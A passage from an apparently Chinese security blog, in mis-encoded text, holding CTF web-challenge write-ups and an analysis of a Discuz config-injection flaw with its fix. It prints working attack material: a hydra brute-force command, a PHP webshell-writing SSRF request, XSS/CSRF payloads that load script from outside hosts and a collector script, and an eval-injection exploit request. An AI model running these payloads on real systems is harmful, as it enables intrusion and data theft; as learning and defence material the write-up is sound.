class="number">40</span>qq.com&amp;verify=elbpi</span></span><br></pre></td></tr></table></figure><p>flagåœ¨tmpä¸‹ <img src="/images/2018/07/geek-2.jpg" alt="blacsheep" /></p><h3 id="babyweb">babyweb</h3><p>hydraçˆ†å‡ºmysqlçš„rootå¯†ç ,è™½ç„¶ç°åœ¨å·²ç»çˆ†ä¸äº†äº†..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -p 1q2w3e4r5t6y 117.50.1.145 mysql</span><br></pre></td></tr></table></figure><p>å½“ç„¶é‡Œé¢çš„-på¯ä»¥æ¢æˆ-Pç„¶åè·Ÿå­—å…¸æ–‡ä»¶,è¿™ä¸ªå¼±å¯†ç åœ¨æŸtop3575å¼±å¯†ç é‡Œé¢æœ‰,æ˜¯å¯ä»¥çˆ†å‡ºæ¥çš„... ç„¶åä»åº“é‡Œé¢å‘ç°è´¦å·å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:BabyWeb@my.lol</span><br><span class="line">password:babyweb@1990</span><br></pre></td></tr></table></figure><p>å·®ä¸€ç‚¹ç‚¹å°±çŒœå‡ºæ¥äº†..æˆ‘å½“æ—¶è¯•çš„è´¦å·æ˜¯BabyWeb@my.lol,å¯†ç è¯•çš„æ˜¯babyweb&amp;1990,æœ‰ç‚¹å¯æƒœ... è¿›å»ä¹‹åå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹,ä¸Šä¼ çš„åå­—ä¸çŸ¥é“,è¿™é‡Œéœ€è¦è¿æ•°æ®åº“ç„¶åè¿™é‡Œè¯´åªæœ‰.htaccesså¯ä»¥ä¼ ,é‚£å°±ä¼ .htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åä¼ ä¸ªabcç»“å°¾çš„æ–‡ä»¶å°±getshelläº† ä¸è¿‡éœ€è¦è¿æ¥æ•°æ®åº“...ç°åœ¨å·²ç»è¿ä¸ä¸Šäº†,å°±ä¸æ¼”ç¤ºäº† éå¸¸è§„è§£æ˜¯è¯»äº†/etc/shadow,ç„¶åç”¨johnè§£å‡ºsshå¯†ç ç„¶åè¿ä¸Šå»æ‹¿flagçš„... <img src="/images/2018/07/geek-3.png" alt="blacsheep" /> å¤§ä½¬å¤§ä½¬orz...</p><h3 id="pentest">pentest</h3><p>è¿™ä¸ªé¢˜...å¥½å§æ„Ÿè§‰è›®å‘çš„,æ‰«ç›®å½•å¾—åˆ°/file/file.php,å‘ç°æ˜¯ä¸ªä»»æ„æ–‡ä»¶åˆ é™¤,åˆ é™¤æ‰configé‡Œé¢çš„install.lockç„¶åå°±å¯ä»¥é‡è£…,é‡è£…çš„æ—¶å€™æ•°æ®åº“é…ç½®æ’å…¥ä¸€å¥è¯æœ¨é©¬,å¯ä»¥æœ¬åœ°å…ˆè¯•è¯•,ç„¶åå†å»æ‰“æœåŠ¡å™¨,ç„¶åå°±shelläº†... <img src="/images/2018/07/geek-3.jpg" alt="blacsheep" /> ç„¶å/tmpä¸‹æ‰¾åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6d791d58-5b04-4406-ad07-78a3dcac6802&#125;</span><br></pre></td></tr></table></figure><h3 id="mysql-online">Mysql Online</h3><p>è¿™ä¸ªé¢˜çš„xssæ€è·¯è›®å¥½çš„,è™½ç„¶é¢˜ç›®æ˜¯ä¸ªmysqlè€Œä¸”æˆ‘æ€è·¯ä¸€å¼€å§‹ç›´æ¥å°±é”™äº†... åˆ©ç”¨sqlè¯»çš„æ•°æ®å¯ä»¥é€ æˆxss <img src="/images/2018/07/geek-4.jpg" alt="blacsheep" /> å½“ç„¶ä½ ä¹Ÿå¯ä»¥unhexä¸€ä¸‹,ä¸€æ ·çš„ åœ¨æäº¤çš„contenté‡Œé¢å¡«è‡ªå·±çš„vps,ç„¶åå¾—åˆ°è¿”å› <img src="/images/2018/07/geek-5.jpg" alt="blacsheep" /> å¯ä»¥çœ‹åˆ°ç™»å½•é¡µé¢,é‚£ä¹ˆä¸‹é¢å°±æ˜¯é€šè¿‡csrfæ¥è®©ä»–æ‰“åˆ°è‡ªå·±çš„é¡µé¢å’¯,vpsä¸Šæ„é€ é¡µé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/runsql.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sql&quot; value=&quot;select 0x3c736372697074207372633d68747470733a2f2f78737370742e636f6d2f32724f7a6c773f313533323333333438363e3c2f7363726970743e&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ç®€å•çš„ä¸€ä¸ªé¡µé¢,è®©æœåŠ¡ç«¯å‘127.0.0.1çš„runsql.phpå‘è¯·æ±‚,æœåŠ¡ç«¯è¯·æ±‚ä¹‹åå¯¼è‡´xssçš„payloadç”Ÿæ•ˆ...ç¬¬ä¸€æ¬¡æ‰“csrf,å­¦ä¹ äº†å­¦ä¹ äº†... æœåŠ¡ç«¯è®¿é—®ä¹‹å,ä¿¡æ¯æ‰“åˆ°xssptä¸Š,çœ‹ä¸€ä¸‹ç»“æœ <img src="/images/2018/07/geek-6.jpg" alt="blacsheep" /> å‘ç°cookieæ²¡ä¸œè¥¿,é‚£æˆ‘ä»¬å»æ‰“ä¸€ä¸‹admin_zzzz666.phpçš„é¡µé¢,å¾—åˆ°ç»“æœ <img src="/images/2018/07/geek-7.jpg" alt="blacsheep" /> baseè§£ä¸€ä¸‹,å¾—åˆ°é¡µé¢å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">403: only 127.0.0.1 can find me, so you can get this: http://127.0.0.1/runsql.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Online Mysql Run&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h3&gt;Admin Index:&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;./static/img/iamsecret_555.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">I am l3m0n tree.</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸ªå›¾ç‰‡,ç›´æ¥è®¿é—®,å‘ç°403äº†,é‚£ä¹ˆå»è·å–è¿™ä¸ªå›¾ç‰‡å’¯,githubä¸Šé¢æœ‰ä¸ªå¯ä»¥canvasç”»é¡µé¢çš„å·¥å…·,ç»™ä¸ªé“¾æ¥ <a href="https://github.com/Lz1y/frame2canvas" title="https://github.com/Lz1y/frame2canvas">https://github.com/Lz1y/frame2canvas</a> ç„¶åä¿®æ”¹ä¸€ä¸‹é…ç½® <img src="/images/2018/07/geek-9.jpg" alt="blacsheep" /> ç„¶åpayload,payloadæ³¨æ„hexä¸€ä¸‹ç„¶åä¼ åˆ°sqlå˜é‡é‡Œé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=&quot;myIframe&quot; src=&quot;admin_zzzz666.php&quot;&gt;&lt;/iframe&gt;&lt;script src=&quot;//attack.com/atk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸€ä¸ªreceive.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;log.txt&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;v&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ”¶åˆ°log.txtäº†,ç„¶åbaseè½¬å›¾ç‰‡å°±å¯ä»¥çœ‹åˆ°flagäº† <img src="/images/2018/07/geek-8.jpg" alt="blacsheep" /></p><h3 id="dedefun">dedefun</h3><p>è¿™ä¸ªé¢˜å…¶å®è¿˜æ˜¯è¿œå¤çš„getimagesizeæš´è·¯å¾„é‚£ä¸ªç‚¹,ä¸è¿‡æœ‰æ›´æ–°,å°±æ˜¯getimagesizeå¯ä»¥é€ æˆssrf,æ¯”å¦‚è¯´æˆ‘åœ¨æˆ‘çš„kaliä¸Šé…ä¸€ä¸ªç®€å•é¡µé¢ <img src="/images/2018/07/geek-9-1.jpg" alt="blacsheep" /> è®¿é—®ä¹‹å,å‘ç°åœ¨vpsä¸Šæ”¶åˆ°æ˜¾ç¤º <img src="/images/2018/07/geek-10.jpg" alt="blacsheep" /> ç„¶åå°±æ²¡æœ‰äº†,å› ä¸ºè¿™é“é¢˜å°±æ˜¯ä¸ªssrfçš„ç‚¹... é¢˜ç›®æè¿°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è¿ç»´è‡ªå·±çš„ç½‘ç«™ï¼Œæˆ‘è¿˜æ˜¯å–œæ¬¢ç”¨shellçš„æ–¹å¼ï¼Œè¿™æ ·è‚¯å®šæ²¡äººèƒ½æ—¥è¿›æ¥äº†ã€‚</span><br><span class="line">1.php</span><br><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">    die(&#x27;Who are you? your ip is:&#x27;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç›´æ¥</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tags.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>love.lemon</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,ja;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>YDAL_2132_saltkey=umJCWaoK; YDAL_2132_lastvisit=1531231707; YDAL_2132_ulastactivity=8d9ffh%2BiVUvLiWxFVmAltTKPHq5V9hUJ5PvDa4s84r553KMhDZMx; YDAL_2132_auth=a017j1pf9qMN%2F5Pa1g7C6kyv3ik6f%2B7eqtppI5c6sSWzI0ggQU5wSkRNDoXuXqvSSMnI%2BN3ObxEMn7jaaNJW; YDAL_2132_nofavfid=1; YDAL_2132_lip=10.211.55.2%2C1531237092; YDAL_2132_home_diymode=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>251</span><br><span class="line"></span><br><span class="line"><span class="language-asciidoc">dopost=save&amp;_FILES[lsa][tmp_name]=<span class="link">http://127.0.0.1/1.php?a=assert%26b=file_put_contents($_GET</span>[<span class="string">1</span>],base64_decode($_GET[2]));%261=./uploads/soft/aaaa.php%262=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;_FILES[lsa][name]=0&amp;_FILES[lsa][size]=0&amp;_FILES[lsa][type]=image/gif</span></span><br></pre></td></tr></table></figure><p>å°±okäº†,æ²¡å•¥å¥½è¯´çš„</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dzæ¼æ´æ•´ç†(æŒç»­æ›´æ–°)</title>
      <link href="/2018/07/22/dz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
      <url>/2018/07/22/dz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>è¿‘æœŸç¢°åˆ°ä¸€äº›dzçš„æ¼æ´,åšäº†ä¸€ä¸‹æŸæ˜¥ç§‹ä¸Šé¢çš„é¢˜,å¤§æ¦‚çš„è®°å½•ä¸€ä¸‹å§,é¡ºä¾¿åˆ†æä¸€ä¸‹æºç .</p><h3 id="utilityconvertindex.phpåˆ©ç”¨">/utility/convert/index.phpåˆ©ç”¨</h3><p>ç‰ˆæœ¬æœªçŸ¥,ä¹‹å‰çœ‹æ˜¯dzçš„é€šæ€,ç°åœ¨ä¸çŸ¥é“äº†.. é¦–å…ˆè®¿é—®è¿™ä¸ªé“¾æ¥ ç„¶åå‘ç°æ˜¯ä¸ªç‰ˆæœ¬åˆ‡æ¢çš„ç•Œé¢ è®¾ç½®æœåŠ¡å™¨ä¿¡æ¯çš„ä¸œè¥¿ä¼šå†™åˆ°é…ç½®æ–‡ä»¶,é…ç½®é¡µé¢å¯è¿èœåˆ€</p><h4 id="è´´ä¸ªexp">è´´ä¸ªexp</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.test.ichunqiu</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>199</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">newconfig</span>[aaa%<span class="number">0</span>a%<span class="number">0</span>deval(CHR(<span class="number">101</span>).CHR(<span class="number">118</span>).CHR(<span class="number">97</span>).CHR(<span class="number">108</span>).CHR(<span class="number">40</span>).CHR(<span class="number">34</span>).CHR(<span class="number">36</span>).CHR(<span class="number">95</span>).CHR(<span class="number">80</span>).CHR(<span class="number">79</span>).CHR(<span class="number">83</span>).CHR(<span class="number">84</span>).CHR(<span class="number">91</span>).CHR(<span class="number">99</span>).CHR(<span class="number">93</span>).CHR(<span class="number">59</span>).CHR(<span class="number">34</span>).CHR(<span class="number">41</span>).CHR(<span class="number">59</span>));//]=aaaa&amp;submit=yes</span></span><br></pre></td></tr></table></figure><p>ä»£ç å¯ä»¥ç›´æ¥getshell,æ¶æ„ä»£ç å†™å…¥/convert/data/config.inc.phpæ–‡ä»¶ä¸­</p><h4 id="æ¼æ´ä»£ç åˆ†æ">æ¼æ´ä»£ç åˆ†æ</h4><p><code>\discuz\utility\convert\index.php</code> <img src="/images/2018/07/dz-1.png" alt="blacsheep" /> æŸ¥çœ‹do_config.inc.php,å…³é”®å‡½æ•°save_config_file <img src="/images/2018/07/dz-2.png" alt="blacsheep" /> è·Ÿè¿›<code>\discuz\utility\convert\include\global.func.php</code>å»çœ‹å‡½æ•° <img src="/images/2018/07/dz-3.png" alt="blacsheep" /> å…³é”®å‡½æ•°getvars,ç»§ç»­è·Ÿè¿› <img src="/images/2018/07/dz-4.png" alt="blacsheep" /> å…³é”®å‡½æ•°buildarray</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildarray</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$level</span> = <span class="number">0</span>, <span class="variable">$pre</span> = <span class="string">&#x27;$_config&#x27;</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$ks</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ks</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$return</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$newline</span> = <span class="title function_ invoke__">str_pad</span>(<span class="string">&#x27;  CONFIG &#x27;</span>.<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$key</span>).<span class="string">&#x27;  &#x27;</span>, <span class="number">50</span>, <span class="string">&#x27;-&#x27;</span>, STR_PAD_BOTH);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            è¿™é‡Œæ˜¯äº§ç”Ÿæ¼æ´å…³é”®</span></span><br><span class="line"><span class="comment">            1. DISCUZçš„æœ¬æ„æ˜¯ä½¿ç”¨$configæ•°ç»„çš„keyä½œä¸ºæ¯ä¸€å—é…ç½®åŒºåŸŸçš„&quot;æ³¨é‡Šæ ‡é¢˜&quot;</span></span><br><span class="line"><span class="comment">            2. å†™å…¥é…ç½®æ–‡ä»¶çš„$newlineä¾èµ–äº$keyï¼Œè€Œ$keyæ˜¯æ”»å‡»è€…å¯æ§çš„</span></span><br><span class="line"><span class="comment">            3. æœªå¯¹è¾“å…¥æ•°æ®è¿›è¡Œæ­£ç¡®çš„è¾¹ç•Œå¤„ç†ï¼Œå¯¼è‡´æ”»å‡»è€…åœ¨è¾“å…¥æ•°æ®ä¸­æ’å…¥æ¢è¡Œç¬¦ï¼Œé€ƒç¦»æ³¨é‡Šçš„ä½œç”¨èŒƒå›´ï¼Œä»è€Œä½¿è¾“å…¥æ•°æ®è½¬åŒ–ä¸ºå¯æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="comment">                1) æ¢è¡Œç¬¦</span></span><br><span class="line"><span class="comment">                2) ?&gt;</span></span><br><span class="line"><span class="comment">            è¿™ç±»å®šç•Œç¬¦éƒ½æ˜¯å¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœçš„</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="variable">$return</span> .= <span class="string">&quot;\r\n// <span class="subst">$newline</span> //\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="title function_ invoke__">buildarray</span>(<span class="variable">$val</span>, <span class="variable">$level</span> + <span class="number">1</span>, <span class="variable">$pre</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$val</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\-?[1-9]\d*$/&quot;</span>, <span class="variable">$val</span>)  <span class="title function_ invoke__">strlen</span>(<span class="variable">$val</span>) &gt; <span class="number">12</span>) ? <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="title function_ invoke__">addcslashes</span>(<span class="variable">$val</span>, <span class="string">&#x27;\&#x27;\\&#x27;</span>).<span class="string">&#x27;\&#x27;&#x27;</span> : <span class="variable">$val</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="variable">$pre</span>.<span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>.<span class="string">&quot; = <span class="subst">$val</span>;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="é˜²å¾¡æ–¹æ³•">é˜²å¾¡æ–¹æ³•</h4><p>å¯ä»¥æŠŠkeyé‡Œé¢çš„éå­—ç¬¦æ•°å­—ä¸‹åˆ’çº¿è½¬æˆç©ºå­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildarray</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$level</span> = <span class="number">0</span>, <span class="variable">$pre</span> = <span class="string">&#x27;$_config&#x27;</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$ks</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ks</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$return</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">//è¿‡æ»¤æ‰$keyä¸­çš„éå­—æ¯ã€æ•°å­—åŠä¸‹åˆ’çº¿å­—ç¬¦</span></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^\w]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$newline</span> = <span class="title function_ invoke__">str_pad</span>(<span class="string">&#x27;  CONFIG &#x27;</span>.<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$key</span>).<span class="string">&#x27;  &#x27;</span>, <span class="number">50</span>, <span class="string">&#x27;-&#x27;</span>, STR_PAD_BOTH);</span><br><span class="line">            <span class="variable">$return</span> .= <span class="string">&quot;\r\n// <span class="subst">$newline</span> //\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="title function_ invoke__">buildarray</span>(<span class="variable">$val</span>, <span class="variable">$level</span> + <span class="number">1</span>, <span class="variable">$pre</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$val</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\-?[1-9]\d*$/&quot;</span>, <span class="variable">$val</span>)  <span class="title function_ invoke__">strlen</span>(<span class="variable">$val</span>) &gt; <span class="number">12</span>) ? <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="title function_ invoke__">addcslashes</span>(<span class="variable">$val</span>, <span class="string">&#x27;\&#x27;\\&#x27;</span>).<span class="string">&#x27;\&#x27;&#x27;</span> : <span class="variable">$val</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="variable">$pre</span>.<span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span 